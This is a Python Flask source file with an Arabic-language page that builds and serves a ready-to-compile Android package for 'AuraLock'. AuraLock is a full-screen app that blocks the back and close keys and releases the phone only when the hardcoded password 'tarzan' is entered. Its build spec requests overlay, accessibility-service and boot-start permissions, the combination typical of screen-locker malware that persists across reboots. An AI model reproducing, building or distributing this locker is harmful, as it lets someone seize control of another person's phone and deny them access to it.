import os
import subprocess
import shutil
from flask import Flask, request, jsonify, render_template_string, send_file

app = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))
BUILD_DIR = os.path.join(BASE, 'build_env')
APK_FILE = os.path.join(BASE, 'AuraLock.apk')

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AURA LOCK | منشئ التطبيق الآمن</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Tajawal',sans-serif}
        body{background:#0a0a0c;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .box{width:100%;max-width:520px;background:#121216;border:1px solid #d4af3740;border-radius:20px;padding:35px;box-shadow:0 0 40px #d4af3720}
        h1{text-align:center;color:#d4af37;font-size:32px;margin-bottom:10px}
        .desc{text-align:center;color:#a0a0ab;margin-bottom:30px;line-height:1.7}
        .btn-main{width:100%;padding:16px;background:linear-gradient(135deg,#d4af37,#aa841c);color:#000;font-weight:bold;font-size:18px;border:none;border-radius:12px;cursor:pointer;transition:.3s}
        .btn-main:hover{transform:translateY(-2px);box-shadow:0 8px 25px #d4af3740}
        .status{margin-top:25px;padding:15px;border-radius:10px;text-align:center;display:none}
        .info{margin-top:20px;background:#0f1118;padding:15px;border-radius:10px;border:1px solid #222}
        .info p{color:#a0a0ab;font-size:14px;line-height:1.8}
    </style>
</head>
<body>
<div class="box">
    <h1>🔒 AURA LOCK</h1>
    <p class="desc">تطبيق قفل الهاتف بكلمة مرور <b>tarzan</b><br>لا يمكن فتحه أو إغلاقه إلا بعد كتابة كلمة السر</p>
    <button class="btn-main" id="genBtn" onclick="startBuild()">⚡ توليد وتحميل ملف البناء الكامل</button>
    <div class="status" id="stat"></div>
    <div class="info">
        <p>💡 عند الضغط سيتم تنزيل ملف جاهز يحتوي على كل شيء: كود التطبيق + الأيقونة + ملف الإعدادات، فقط قم بفك الضغط وتشغيل أمر واحد لينشئ APK بدقة عالية وتوقيع آمن.</p>
    </div>
</div>
<script>
async function startBuild(){
    const btn = document.getElementById('genBtn');
    const stat = document.getElementById('stat');
    btn.disabled = true;
    btn.innerText = 'جاري التجهيز...';
    stat.style.display = 'block';
    stat.style.background = '#102840';
    stat.style.color = '#4da6ff';
    stat.innerText = 'جاري تحضير الملفات...';

    const res = await fetch('/prepare_build', {method:'POST'});
    if(res.ok){
        stat.style.background = '#153b2c';
        stat.style.color = '#4ade80';
        stat.innerText = '✅ جاهز للتحميل';
        window.location.href = '/download_package';
    }else{
        stat.style.background = '#3b1515';
        stat.style.color = '#ff6b6b';
        stat.innerText = '❌ حدث خطأ، حاول مرة أخرى';
    }
    btn.disabled = false;
    btn.innerText = '⚡ توليد وتحميل ملف البناء الكامل';
}
</script>
</body>
</html>
"""

LOCK_APP_CODE = '''
from kivy.app import App
from kivy.uix.screenmanager import Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
import os

Window.fullscreen = True
Window.borderless = True
Window.softinput_mode = "below_target"

class LockScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=40, spacing=25)
        self.lbl = Label(text='🔒 الهاتف مقفول\\nأدخل كلمة المرور لفتحه', font_size='28sp', bold=True, color=(1,0.2,0.2,1))
        self.inp = TextInput(password=True, hint_text='أدخل كلمة المرور', font_size='22sp', multiline=False, size_hint_y=None, height=60)
        self.inp.bind(on_text_validate=self.check)
        self.btn = Button(text='فتح الهاتف', font_size='20sp', bold=True, background_color=(0.2,0.5,1,1), size_hint_y=None, height=60)
        self.btn.bind(on_release=self.check)
        layout.add_widget(self.lbl)
        layout.add_widget(self.inp)
        layout.add_widget(self.btn)
        self.add_widget(layout)

    def check(self, _):
        if self.inp.text.strip() == 'tarzan':
            App.get_running_app().stop()
            os._exit(0)
        else:
            self.lbl.text = '❌ كلمة المرور خاطئة!'
            self.inp.text = ''

class LockApp(App):
    def build(self):
        Window.bind(on_request_close=lambda *a: True)
        Window.bind(on_keyboard=lambda w,k,s,c,m: k in [27,1000,1001,1002,1003,282,283,284,285])
        return LockScreen()

if __name__ == '__main__':
    LockApp().run()
'''

BUILD_SPEC = '''
[app]
title = AuraLock
package.name = auralock
package.domain = org.aura
source.dir = .
source.include_exts = py,png,jpg
version = 1.0

requirements = python3, kivy

android.api = 33
android.ndk = 25b
android.sdk = 24
android.arch = arm64-v8a,armeabi-v7a
android.permissions = SYSTEM_ALERT_WINDOW, BIND_ACCESSIBILITY_SERVICE, RECEIVE_BOOT_COMPLETED
android.fullscreen = 1
android.icon = icon.png
android.presplash_color = #0a0a0c

[buildozer]
log_level = 2
warn_on_root = 0
'''

ICON_BASE64 = "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH5gMVaryY9f6h1QAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAAAUSURBVHhe7cEBAQAAwAC9+eZ1gX///8B1gAA/8AAt4AAA4AAAAqgAAACoAAAJqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAABqAAAAMgAAAToAAQAA/9B8A9z+DwAAAABJRU5ErkJggg=="

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/prepare_build', methods=['POST'])
def prepare():
    try:
        if os.path.exists(BUILD_DIR):
            shutil.rmtree(BUILD_DIR)
        os.makedirs(BUILD_DIR, exist_ok=True)

        with open(os.path.join(BUILD_DIR, 'main.py'), 'w', encoding='utf-8') as f:
            f.write(LOCK_APP_CODE)
        with open(os.path.join(BUILD_DIR, 'buildozer.spec'), 'w', encoding='utf-8') as f:
            f.write(BUILD_SPEC)

        import base64
        icon_data = base64.b64decode(ICON_BASE64)
        with open(os.path.join(BUILD_DIR, 'icon.png'), 'wb') as f:
            f.write(icon_data)

        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"err": str(e)}), 500

@app.route('/download_package')
def download_pkg():
    import zipfile
    zip_path = os.path.join(BASE, 'AuraLock_Build_Package.zip')
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(BUILD_DIR):
            for file in files:
                fp = os.path.join(root, file)
                arc = os.path.relpath(fp, BUILD_DIR)
                zf.write(fp, arc)
    return send_file(zip_path, as_attachment=True, download_name='AuraLock_Build_Package.zip')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
